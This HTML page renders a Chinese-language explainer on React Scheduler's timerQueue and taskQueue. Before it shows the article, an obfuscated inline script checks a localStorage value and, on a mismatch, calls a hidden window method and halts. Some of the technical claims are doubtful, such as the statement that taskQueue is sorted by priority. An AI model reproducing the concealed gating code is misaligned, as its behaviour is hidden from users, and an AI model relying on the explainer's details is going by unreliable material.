<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x4e03(){var e=["W4VcJeldSsn7WPa","gmoqW5pdMcddMM0rW4C","WRe4W5b2W7fqWP8","WRa0e8oOW5lcVNNcJJmgDNb7","mZ7dHcv3W57dLa04W6SlaW","aCoMnxFdHSkeWP87Bq","ySooW6POgtDTWOZcQaiPxSkm","W6nIWQxdLtCduZRdJmk9W6ldNwu","W40ShGRdTxtcJSkFW5pdMJ8a","WRvKhSkboKZcUSoWW7tcP8oX","C1atW5K2WO53WQvAWRrBWPNcJW","W4RdM8khB8ktW5JcTc3dSSoqW4ae","W4GIfW3cLqBcG8keW5hdVq","wSk+WPJdPCoVBxW","W6SJW6TVW7iOW6BdKcukumkgW6FdUSk2ohNdOrJdJIngtYRcKam","aCoLorBcNSolWPmrrNKSja","aaDcWOP3W4GpWRLm","W7tdMmkjWRyNW4RdQWOtWQC","W4RdMmkgemoZWOVcKGRdRG","f0lcIgRdT8kTWRxdJmomimkM","W4SUfa7dUhZdSSk+W47dSIKFaW","fbtdSdtcT8kkWRu","pmomqbBcK8oKWR0/werd","WQWjWRhcRJ/cOaGQ","W73cK8o8pWVcI38","W7jEW6ddUxldUvijcSkdemkBBG","hSkCtrxcTrVcQupcNW","A0ldTZmMWOdcQ8kPpW4T","WRatWQhcVdi","WOZcICoco8ogWOpcHW"];return(_0x4e03=function(){return e})()}var _0xba4d66=_0x2355;function _0x2355(t,e){var d=_0x4e03();return(_0x2355=function(e,o){var n=d[e-=252];void 0===_0x2355.NZRdpX&&(_0x2355.XMGgwh=function(e,o){var n,r=[],t=0,d="";for(e=(e=>{for(var o,n,r="",t="",d=0,c=0;n=e.charAt(c++);~n&&(o=d%4?64*o+n:n,d++%4)&&(r+=String.fromCharCode(255&o>>(-2*d&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);for(var u=0,s=r.length;u<s;u++)t+="%"+("00"+r.charCodeAt(u).toString(16)).slice(-2);return decodeURIComponent(t)})(e),c=0;c<256;c++)r[c]=c;for(c=0;c<256;c++)t=(t+r[c]+o.charCodeAt(c%o.length))%256,n=r[c],r[c]=r[t],r[t]=n;for(var c=0,t=0,u=0;u<e.length;u++)n=r[c=(c+1)%256],r[c]=r[t=(t+r[c])%256],r[t]=n,d+=String.fromCharCode(e.charCodeAt(u)^r[(r[c]+r[t])%256]);return d},t=arguments,_0x2355.NZRdpX=!0);var e=e+d[0],r=t[e];return r?n=r:(void 0===_0x2355.WPTUCV&&(_0x2355.WPTUCV=!0),n=_0x2355.XMGgwh(n,o),t[e]=n),n})(t,e)}if((()=>{for(var e=_0x2355,o=_0x4e03();;)try{if(459247==+parseInt(e(261,"4eL7"))+-parseInt(e(259,"TDtu"))/2*(-parseInt(e(267,"yaTR"))/3)+parseInt(e(270,"IcBX"))/4*(-parseInt(e(264,"1gh%"))/5)+parseInt(e(254,"uWVR"))/6*(parseInt(e(253,"u2[b"))/7)+parseInt(e(260,"!hD]"))/8+parseInt(e(274,"5HLP"))/9*(parseInt(e(266,"W^[M"))/10)+parseInt(e(265,"@o3i"))/11*(-parseInt(e(275,"qYBv"))/12))break;o.push(o.shift())}catch(e){o.push(o.shift())}})(),localStorage[_0xba4d66(281,"Nw89")](_0xba4d66(273,"yaTR"))!=_0xba4d66(255,"cS9z"))throw window[_0xba4d66(280,"cS9z")][_0xba4d66(256,"qYBv")](_0xba4d66(271,"TDtu")),Error();document.title="react Scheduler 的 timerQueue、taskQueue",document.getElementById("article").innerHTML="<div><p>React Scheduler 维护的两个任务队列——<code>timerQueue</code> 和 <code>taskQueue</code>，在任务调度过程中起着关键作用。以下是对这两个队列的详细解析：</p>\n<hr>\n<h3><strong>1. <code>timerQueue</code> 队列</strong></h3>\n<h4><strong>1.1 作用</strong></h4>\n<ul>\n<li><strong>存储未过期的任务</strong>  ：<code>timerQueue</code> 用于存放那些尚未到达执行时间的任务。</li>\n<li><strong>按过期时间排序</strong>  ：任务在 <code>timerQueue</code> 中根据过期时间进行排序，确保最早过期的任务最先被处理。</li>\n</ul>\n<h4><strong>1.2 工作原理</strong></h4>\n<ul>\n<li><strong>任务注册</strong>  ：当任务被注册到 Scheduler 时，如果任务的过期时间尚未到达，它会被放入 <code>timerQueue</code>。</li>\n<li><strong>定时检查</strong>  ：Scheduler 会定期检查 <code>timerQueue</code>，将已过期的任务移动到 <code>taskQueue</code> 中。</li>\n<li><strong>优先级管理</strong>  ：即使任务在 <code>timerQueue</code> 中，Scheduler 也会根据其优先级进行排序，确保高优先级任务在过期后能优先执行。</li>\n</ul>\n<h4><strong>1.3 示例</strong></h4>\n<p>假设有三个任务，过期时间分别为 10ms、20ms 和 30ms 后：</p>\n<ul>\n<li>初始时，这三个任务都会被放入 <code>timerQueue</code>。</li>\n<li>10ms 后，第一个任务过期，被移动到 <code>taskQueue</code>。</li>\n<li>20ms 后，第二个任务过期，被移动到 <code>taskQueue</code>。</li>\n<li>30ms 后，第三个任务过期，被移动到 <code>taskQueue</code>。</li>\n</ul>\n<hr>\n<h3><strong>2. <code>taskQueue</code> 队列</strong></h3>\n<h4><strong>2.1 作用</strong></h4>\n<ul>\n<li><strong>存储已过期的任务</strong>  ：<code>taskQueue</code> 用于存放那些已经到达执行时间的任务。</li>\n<li><strong>按优先级排序</strong>  ：任务在 <code>taskQueue</code> 中根据优先级进行排序，确保高优先级任务优先执行。</li>\n</ul>\n<h4><strong>2.2 工作原理</strong></h4>\n<ul>\n<li><strong>任务移动</strong>  ：当 <code>timerQueue</code> 中的任务过期时，它们会被移动到 <code>taskQueue</code>。</li>\n<li><strong>任务执行</strong>  ：Scheduler 会从 <code>taskQueue</code> 中取出任务并执行。</li>\n<li><strong>优先级调度</strong>  ：在执行任务时，Scheduler 会根据任务的优先级进行调度，确保高优先级任务优先得到处理。</li>\n</ul>\n<h4><strong>2.3 示例</strong></h4>\n<p>继续上面的例子，假设在 15ms 时，Scheduler 开始执行任务：</p>\n<ul>\n<li>此时，<code>taskQueue</code> 中只有第一个任务（过期时间为 10ms）。</li>\n<li>Scheduler 从 <code>taskQueue</code> 中取出第一个任务并执行。</li>\n<li>20ms 后，第二个任务过期，被移动到 <code>taskQueue</code>，Scheduler 接着执行第二个任务。</li>\n<li>30ms 后，第三个任务过期，被移动到 <code>taskQueue</code>，Scheduler 执行第三个任务。</li>\n</ul>\n<hr>\n<h3><strong>3. 两个队列的协同工作</strong></h3>\n<h4><strong>3.1 任务流动</strong></h4>\n<ul>\n<li><strong>从 <code>timerQueue</code> 到 <code>taskQueue</code></strong>  ：任务在 <code>timerQueue</code> 中等待过期，过期后被移动到 <code>taskQueue</code>。</li>\n<li><strong>从 <code>taskQueue</code> 到执行</strong>  ：任务在 <code>taskQueue</code> 中按优先级排序，等待被 Scheduler 执行。</li>\n</ul>\n<h4><strong>3.2 调度策略</strong></h4>\n<ul>\n<li><strong>时间分片</strong>  ：Scheduler 采用时间分片技术，每次从 <code>taskQueue</code> 中取出任务执行一段时间（通常为 5ms），然后让出控制权给浏览器。</li>\n<li><strong>优先级调整</strong>  ：在任务执行过程中，如果高优先级任务到来，Scheduler 可能会中断当前任务，优先执行高优先级任务。</li>\n</ul>\n<h4><strong>3.3 示例流程</strong></h4>\n<ol>\n<li><strong>任务注册</strong>  ：多个任务被注册到 Scheduler，根据过期时间放入 <code>timerQueue</code>。</li>\n<li><strong>定时检查</strong>  ：Scheduler 定期检查 <code>timerQueue</code>，将已过期的任务移动到 <code>taskQueue</code>。</li>\n<li><strong>任务执行</strong>  ：Scheduler 从 <code>taskQueue</code> 中取出任务执行，采用时间分片技术控制执行时间。</li>\n<li><strong>优先级调度</strong>  ：在任务执行过程中，根据任务的优先级进行调度，确保高优先级任务优先执行。</li>\n</ol>\n<hr>\n<h3><strong>4. 优势</strong></h3>\n<ul>\n<li><strong>提高响应速度</strong>  ：通过 <code>timerQueue</code> 和 <code>taskQueue</code> 的协同工作，Scheduler 能够确保高优先级任务优先执行，提高应用的响应速度。</li>\n<li><strong>优化资源利用</strong>  ：Scheduler 能够更合理地利用 CPU 和内存资源，避免不必要的资源浪费。</li>\n<li><strong>改善用户体验</strong>  ：通过时间分片和优先级调度，Scheduler 能够确保界面流畅，避免长时间卡顿。</li>\n</ul>\n<hr>\n<h3><strong>5. 总结</strong></h3>\n<ul>\n<li><strong><code>timerQueue</code></strong>  ：用于存放未过期的任务，按过期时间排序。</li>\n<li><strong><code>taskQueue</code></strong>  ：用于存放已过期的任务，按优先级排序。</li>\n<li><strong>协同工作</strong>  ：两个队列协同工作，确保任务按优先级和过期时间得到合理调度和执行。</li>\n</ul>\n<p>通过 <code>timerQueue</code> 和 <code>taskQueue</code> 的管理，React Scheduler 能够高效地处理任务，确保应用的高性能和响应速度。</p>\n</div>"</script></body></html>